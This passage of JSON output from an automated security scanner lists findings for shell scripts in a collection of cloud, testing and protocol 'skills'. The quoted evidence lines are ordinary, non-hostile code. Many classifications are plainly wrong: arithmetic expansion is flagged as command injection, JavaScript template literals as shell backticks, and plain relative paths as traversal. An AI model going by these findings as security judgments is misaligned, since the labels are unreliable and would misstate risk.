      "line_number": 309,
      "issue": "Command substitution in shell",
      "evidence": "total_duration=$(awk '{sum+=$1} END {print sum}' \"$tmp_dir\"/duration_* 2>/dev/null || echo \"0\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 314,
      "issue": "Command substitution in shell",
      "evidence": "avg_duration=$(echo \"scale=3; $total_duration / $successful_requests\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 319,
      "issue": "Command substitution in shell",
      "evidence": "success_rate=$(echo \"scale=2; $successful_requests * 100 / $total_requests\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 322,
      "issue": "Command substitution in shell",
      "evidence": "local rps=$(echo \"scale=2; $total_requests / $duration\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 94,
      "issue": "Command substitution in shell",
      "evidence": "TESTS_RUN=$((TESTS_RUN + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 97,
      "issue": "Command substitution in shell",
      "evidence": "TESTS_PASSED=$((TESTS_PASSED + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 100,
      "issue": "Command substitution in shell",
      "evidence": "TESTS_FAILED=$((TESTS_FAILED + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 250,
      "issue": "Command substitution in shell",
      "evidence": "deployments=$(kubectl get deployments -n \"$NAMESPACE\" -o jsonpath='{.items[*].metadata.name}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 273,
      "issue": "Command substitution in shell",
      "evidence": "pods=$(kubectl get pods -n \"$NAMESPACE\" -o json)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 276,
      "issue": "Command substitution in shell",
      "evidence": "total_pods=$(echo \"$pods\" | jq -r '.items | length')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 286,
      "issue": "Command substitution in shell",
      "evidence": "for i in $(seq 0 $((total_pods - 1))); do",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 288,
      "issue": "Command substitution in shell",
      "evidence": "pod_name=$(echo \"$pods\" | jq -r \".items[$i].metadata.name\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 291,
      "issue": "Command substitution in shell",
      "evidence": "phase=$(echo \"$pods\" | jq -r \".items[$i].status.phase\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 294,
      "issue": "Command substitution in shell",
      "evidence": "ready=$(echo \"$pods\" | jq -r \".items[$i].status.conditions[] | select(.type==\\\"Ready\\\") | .status\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 309,
      "issue": "Command substitution in shell",
      "evidence": "services=$(kubectl get services -n \"$NAMESPACE\" -o jsonpath='{.items[*].metadata.name}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 318,
      "issue": "Command substitution in shell",
      "evidence": "endpoints=$(kubectl get endpoints \"$service\" -n \"$NAMESPACE\" -o json | jq -r '.subsets[0].addresses | length')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 346,
      "issue": "Command substitution in shell",
      "evidence": "services=$(kubectl get services -n \"$NAMESPACE\" -o jsonpath='{.items[*].metadata.name}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 350,
      "issue": "Command substitution in shell",
      "evidence": "first_service=$(echo \"$services\" | awk '{print $1}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 353,
      "issue": "Unencrypted HTTP",
      "evidence": "if kubectl run test-connection --image=curlimages/curl:7.85.0 --rm -i --restart=Never -n \"$NAMESPACE\" -- curl -s --max-time 10 \"http://${first_service}\" &>/dev/null; then",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 394,
      "issue": "Command substitution in shell",
      "evidence": "\"success\": $([ \"$TESTS_FAILED\" -eq 0 ] && echo \"true\" || echo \"false\"),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 396,
      "issue": "Command substitution in shell",
      "evidence": "$(IFS=,; echo \"${TEST_RESULTS[*]}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 421,
      "issue": "Command substitution in shell",
      "evidence": "Usage: $(basename \"$0\") [OPTIONS] MANIFEST_PATH",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 441,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") deployment.yaml",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 444,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --provider minikube manifests/",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 447,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --no-cleanup deployment.yaml",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
      "line_number": 450,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --json deployment.yaml",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 8,
      "issue": "Command substitution in shell",
      "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 11,
      "issue": "Path traversal pattern",
      "evidence": "DOCKER_COMPOSE_FILE=\"${SCRIPT_DIR}/../examples/docker/docker-compose-test.yml\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 62,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 81,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 84,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --coverage",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 87,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --pattern \"test_api_*\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 90,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --parallel --test-dir tests/integration/api",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 93,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --keep-infra --verbose",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 96,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --json",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 99,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --db-type mysql",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 340,
      "issue": "Command substitution in shell",
      "evidence": "framework=$(detect_test_framework)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 370,
      "issue": "Command substitution in shell",
      "evidence": "\"success\": $([ \"$exit_code\" -eq 0 ] && echo \"true\" || echo \"false\"),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
      "line_number": 377,
      "issue": "Command substitution in shell",
      "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 233,
      "issue": "Privilege escalation",
      "evidence": "timeout \"${duration}s\" sudo tcpdump -i \"$interface\" -w \"$output\" -s 0 \"$filter\" 2>&1 | while read -r line; do",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 240,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i \"$interface\" -w \"$output\" -s 0 \"$filter\"",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 255,
      "issue": "Command substitution in shell",
      "evidence": "total_packets=$(tcpdump -r \"$file\" 2>/dev/null | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 291,
      "issue": "Command substitution in shell",
      "evidence": "handshakes=$(tshark -r \"$file\" -Y \"http.upgrade contains WebSocket\" 2>/dev/null | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 298,
      "issue": "Command substitution in shell",
      "evidence": "frames=$(tshark -r \"$file\" -Y \"websocket\" 2>/dev/null | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 348,
      "issue": "Command substitution in shell",
      "evidence": "total_packets=$(tcpdump -r \"$file\" 2>/dev/null | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 354,
      "issue": "Command substitution in shell",
      "evidence": "handshakes=$(tshark -r \"$file\" -Y \"http.upgrade contains WebSocket\" 2>/dev/null | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 355,
      "issue": "Command substitution in shell",
      "evidence": "frames=$(tshark -r \"$file\" -Y \"websocket\" 2>/dev/null | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 366,
      "issue": "Command substitution in shell",
      "evidence": "\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 379,
      "issue": "Command substitution in shell",
      "evidence": "OUTPUT_FILE=\"ws_capture_$(date +%Y%m%d_%H%M%S).pcap\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
      "line_number": 410,
      "issue": "Command substitution in shell",
      "evidence": "filter=$(build_filter)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 147,
      "issue": "Command substitution in shell",
      "evidence": "response=$(curl -sI --http2 --max-time \"$TIMEOUT\" \"$URL\" 2>&1 || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 164,
      "issue": "Command substitution in shell",
      "evidence": "tmpfile=$(mktemp)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 170,
      "issue": "Command substitution in shell",
      "evidence": "pushed_resources=$(grep -i \"< link:\" \"$tmpfile\" | grep -i \"preload\" || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 196,
      "issue": "Command substitution in shell",
      "evidence": "tmpfile=$(mktemp)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 203,
      "issue": "Command substitution in shell",
      "evidence": "push_promises=$(grep \"PUSH_PROMISE\" \"$tmpfile\" || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 216,
      "issue": "Command substitution in shell",
      "evidence": "pushed_paths=$(grep -A 5 \"PUSH_PROMISE\" \"$tmpfile\" | grep \":path:\" | awk '{print $3}' || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 234,
      "issue": "Command substitution in shell",
      "evidence": "tmpfile=$(mktemp)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 238,
      "issue": "Command substitution in shell",
      "evidence": "time_with_push=$( (time curl -s --http2 --max-time \"$TIMEOUT\" \"$URL\" > /dev/null) 2>&1 | grep real | awk '{print $2}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 242,
      "issue": "Command substitution in shell",
      "evidence": "time_without_push=$( (time curl -s --http1.1 --max-time \"$TIMEOUT\" \"$URL\" > /dev/null) 2>&1 | grep real | awk '{print $2}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 258,
      "issue": "Command substitution in shell",
      "evidence": "link_header=$(curl -sI --http2 --max-time \"$TIMEOUT\" \"$URL\" | grep -i \"^link:\" | head -1 || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 267,
      "issue": "Command substitution in shell",
      "evidence": "pushed_resource=$(echo \"$link_header\" | sed -n 's/.*<\\([^>]*\\)>.*/\\1/p' | head -1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 276,
      "issue": "Command substitution in shell",
      "evidence": "base_url=$(echo \"$URL\" | sed 's/\\(https\\?:\\/\\/[^/]*\\).*/\\1/')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 283,
      "issue": "Command substitution in shell",
      "evidence": "cache_control=$(curl -sI --http2 --max-time \"$TIMEOUT\" \"$full_url\" | grep -i \"^cache-control:\" || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
      "line_number": 325,
      "issue": "Command substitution in shell",
      "evidence": "\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
      "line_number": 74,
      "issue": "Command substitution in shell",
      "evidence": "echo \"  cafile $(pwd)/ca.crt\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
      "line_number": 75,
      "issue": "Command substitution in shell",
      "evidence": "echo \"  certfile $(pwd)/server.crt\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
      "line_number": 76,
      "issue": "Command substitution in shell",
      "evidence": "echo \"  keyfile $(pwd)/server.key\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
      "line_number": 81,
      "issue": "Command substitution in shell",
      "evidence": "echo \"    --cafile $(pwd)/ca.crt \\\\\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
      "line_number": 82,
      "issue": "Command substitution in shell",
      "evidence": "echo \"    --cert $(pwd)/client.crt \\\\\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
      "line_number": 83,
      "issue": "Command substitution in shell",
      "evidence": "echo \"    --key $(pwd)/client.key\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
      "line_number": 87,
      "issue": "Command substitution in shell",
      "evidence": "echo \"    --cafile $(pwd)/ca.crt \\\\\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
      "line_number": 88,
      "issue": "Command substitution in shell",
      "evidence": "echo \"    --cert $(pwd)/client.crt \\\\\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
      "line_number": 89,
      "issue": "Command substitution in shell",
      "evidence": "echo \"    --key $(pwd)/client.key\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
      "line_number": 12,
      "issue": "Command substitution in shell",
      "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
      "line_number": 29,
      "issue": "Path traversal pattern",
      "evidence": "#   ../scripts/generate_proto_code.py --proto-file user_service.proto --language python",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
      "line_number": 41,
      "issue": "Command substitution in shell",
      "evidence": "lines=$(wc -l < \"${file}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
      "line_number": 47,
      "issue": "Path traversal pattern",
      "evidence": "\"${SCRIPT_DIR}/../scripts/generate_proto_code.py\" \\",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
      "line_number": 12,
      "issue": "Command substitution in shell",
      "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
      "line_number": 46,
      "issue": "Command substitution in shell",
      "evidence": "lines=$(wc -l < \"${file}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
      "line_number": 110,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Serialized: ${bytes.length} bytes`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
      "line_number": 114,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Deserialized: ${user2.getEmail()}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
      "line_number": 129,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Created user: ${user.getId()}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_go.sh",
      "line_number": 12,
      "issue": "Command substitution in shell",
      "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_go.sh",
      "line_number": 43,
      "issue": "Command substitution in shell",
      "evidence": "lines=$(wc -l < \"${file}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_go.sh",
      "line_number": 49,
      "issue": "Path traversal pattern",
      "evidence": "\"${SCRIPT_DIR}/../scripts/generate_proto_code.py\" \\",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http3-quic/resources/examples/curl_http3_examples.sh",
      "line_number": 100,
      "issue": "Command substitution in shell",
      "evidence": "info \"Downloaded to /tmp/test.html ($(wc -c < /tmp/test.html) bytes)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 57,
      "issue": "Command substitution in shell",
      "evidence": "Usage: $(basename \"$0\") [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 77,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 80,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --method UserService/GetUser",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 83,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --metadata authorization:\"Bearer token123\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 86,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --json > report.json",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 89,
